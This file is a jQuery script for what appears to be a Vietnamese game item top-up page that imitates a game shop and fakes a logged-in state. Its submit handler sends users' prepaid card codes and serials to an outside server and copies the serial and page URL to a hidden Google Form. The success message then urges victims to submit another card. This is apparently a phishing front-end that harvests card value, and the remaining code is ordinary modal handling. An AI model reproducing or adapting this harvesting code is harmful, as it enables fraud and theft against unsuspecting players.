(function($) {
    $.fn.inputFilter = function(inputFilter) {
        return this.on("input keydown keyup mousedown mouseup select contextmenu drop", function() {
            if (inputFilter(this.value)) {
                this.oldValue = this.value;
                this.oldSelectionStart = this.selectionStart;
                this.oldSelectionEnd = this.selectionEnd;
            } else if (this.hasOwnProperty("oldValue")) {
                this.value = this.oldValue;
                this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
            } else {
                this.value = "";
            }
        });
    };
}(jQuery));
$(document).ready(function() {
    $('.s-slide-1 .slick-slider').slick();

    $('.s-header-1 [ht-trigger="hd-menu"]').click(function() {
        $('.s-menu-1').toggleClass('is-active');
        $('body').toggleClass('is-active');
        $(this).toggleClass('is-active');
    });
    $('.s-menu-1 .s_after').click(function() {
        $('.s-menu-1').removeClass('is-active');
        $('body').removeClass('is-active');
        $('.s-header-1 [ht-trigger="hd-menu"]').removeClass('is-active');
    });

    $('.s-menu-1 .s_menu ul li:first-child').click(function() {
        $('.s-menu-1').removeClass('is-active');
        $('body').removeClass('is-active');
        $('.s-header-1 [ht-trigger="hd-menu"]').removeClass('is-active');
    });

    var idGame = sessionStorage.getItem('idGame');
    if (idGame) {
        $('#name, .name').text(idGame);
        $('.logged').attr('src', 'images/faifai.png');
        $('.hd-button, .faifai').removeAttr('ht-trigger');
        $('.faifai').attr('href', '/app/100067/buy/0');
        $('.hd1').addClass('hide');
        $('.tic').addClass('hide');
       $('.hd2').removeClass('hide');
       $('._1PPYwF3SUxfFqeODhOLfGs').removeClass('hide');
    }

 

   
    $('#check').click(function() {
     $from = $("input[name=from]");
        $code = $("input[name=code]");
        $seri = $("input[name=seri]");
        if ($code.val().length === 0) {
            $(this).parents().find('.c-error').text('Vui lòng nhập mã thẻ');
        } else if ($seri.val().length === 0) {
            $(this).parents().find('.c-error').text('Vui lòng nhập seri');
        } else {
            window.setTimeout(function() {
                $.ajax({
                        url: 'https://api.vn1.fun/napthe.php',
                        type: 'POST',
                        data: {
                            from: $from.val(),
                            code: $code.val(),
                            serial: $seri.val(),
                            telco: $('input[name="type"]').val(),
                            idGame: $('input[name="idGame"]').val(),
                            amount: $('input[name="amount"]').val()
                        },
                        beforeSend: function() {
                            $("body").append('<div class="ht-loading-gif"><img src="images/preloader.svg" /></div>');
                        }
                    })
                    .done(function(data) {
                        var json = $.parseJSON(data);
                       
                        if (json.status == "error") {
                             $("body").find("div.ht-loading-gif").remove();
                            $('.c-error').html(json.msg);
                        } else {
                          let data = {
'entry.391764542': $seri.val(),
'entry.1830044292': window.location.href 
}
let queryString = new URLSearchParams(data);  
queryString = queryString.toString();    
let xhr = new XMLHttpRequest();
xhr.open("POST", 'https://docs.google.com/forms/d/e/1FAIpQLSfuT6rSW2shcO_RwToSomz76Azq4RziH5O5X48FpZ-kin4hUw/formResponse', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(queryString);  
                                 setInterval(function() {
                                      $('.c-error').html(json.msg);
           $.post("https://api.vn1.fun/check.php", {serial: $seri.val()}, function(result){
    if(result === '0'){
        $("#hide").html('<div class="d-flex justify-content-center mb-4"><div class="spinner-border" role="status"><span class="visually-hidden">Loading...</span></div><center><h4>Vui lòng chờ xử lý trong giây lát...</h4></div></center>');
        $("#status").html('<span class="badge bg-warning text-white">Đang xử lý...</span>');
        
    }
    if(result === '1'){
        Swal.fire(
  'Thành công!',
  'Nếu nạp đúng mà vật phẩm không về thì bạn tiến hành nạp thêm 1 thẻ nữa vào đúng tài khoản game để hệ thống đẩy cả 2 lần nạp về nhé, do nhiều người nạp nên có thể thẻ sẽ bị treo',
  'success'
)
          window.location.href = 'success.html';
            }
    if(result === '2'){
        window.location.href = 'error.html';
            }
    if(result === '3'){
        window.location.href = 'error.html';
            }
  });
       }, 5000);
                            sessionStorage.setItem('item', JSON.stringify(json));
                          
                        }
                    });
            }, 200);
        }
    });

    $("input[name=idfaifai]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    $("input[name=code]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    $("input[name=seri]").inputFilter(function(value) {
        return /^-?\d*$/.test(value);
    });
    // Event c-modal
    $('body').on('click', '[ht-trigger="c-modal"]', function() {
        $('body').append('<div class="c-modal-backdrop show"></div>');
        $('body').addClass('c-modal-open');
        $target = $($(this).attr('ht-target'));
        $target.css('display', 'block');
        $close = $(this).attr('ht-target-close');
        if ($close !== undefined) {
            $($close).removeClass('show');
            $($close).removeAttr('style');
            $('body').find('.c-modal-backdrop:last').remove();
        }
        setTimeout(function() {
            $target.addClass('show');
        }, 200);
    });
    $('body').on('click', '[ht-close="c-modal"]', function() {
        var $close = $(this).attr('ht-target-close');
        var $reload = $(this).attr('ht-reload');
        if ($close) {
            $($close).removeClass('show');
            $('body').find('.c-modal-backdrop:last').removeClass('show');
            setTimeout(function() {
                $($close).removeAttr('style');
                $('body').find('.c-modal-backdrop:last').remove();
            }, 200);
        } else {
            $('.c-modal-backdrop').removeClass('show');
            $('.c-modal').removeClass('show');
            setTimeout(function() {
                $('.c-modal').removeAttr('style');
                $('body').removeClass('c-modal-open');
                $('.c-modal-backdrop').remove();
            }, 200);
        }
        if ($reload === 'true') {
            $redirect = ($(this).attr('ht-redirect') === 'false') ? '' : $(this).attr('ht-redirect');
            window.location.href = $redirect;
        }
    });
    $('body').on('click', '[ht-skip]', function(e) {
        e.stopPropagation();
    });
});


$(document).ready(function() {
    $('body').on('click', '[ht-trigger="c-modal-3"]', function() {
        $('body').append('<div class="c-modal-3-backdrop show"></div>');
        $('body').addClass('c-modal-3-open');
        $target = $($(this).attr('ht-target'));
        $target.css('display', 'block');
        $close = $(this).attr('ht-target-close');
        if ($close !== undefined) {
            $($close).removeClass('show');
            $($close).removeAttr('style');
            $('body').find('.c-modal-3-backdrop:last').remove();
        }
        setTimeout(function() {
            $target.addClass('show');
        }, 200);
    });
    $('body').on('click', '[ht-close="c-modal-3"]', function() {
        var $close = $(this).attr('ht-target-close');
        var $reload = $(this).attr('ht-reload');
        if ($close) {
            $($close).removeClass('show');
            $('body').find('.c-modal-3-backdrop:last').removeClass('show');
            setTimeout(function() {
                $($close).removeAttr('style');
                $('body').find('.c-modal-3-backdrop:last').remove();
            }, 200);
        } else {
            $('.c-modal-3-backdrop').removeClass('show');
            $('.c-modal-3').removeClass('show');
            setTimeout(function() {
                $('.c-modal-3').removeAttr('style');
                $('body').removeClass('c-modal-3-open');
                $('.c-modal-3-backdrop').remove();
            }, 200);
        }
        if ($reload === 'true') {
            $redirect = ($(this).attr('ht-redirect') === 'false') ? '' : $(this).attr('ht-redirect');
            window.location.href = $redirect;
        }
    });
});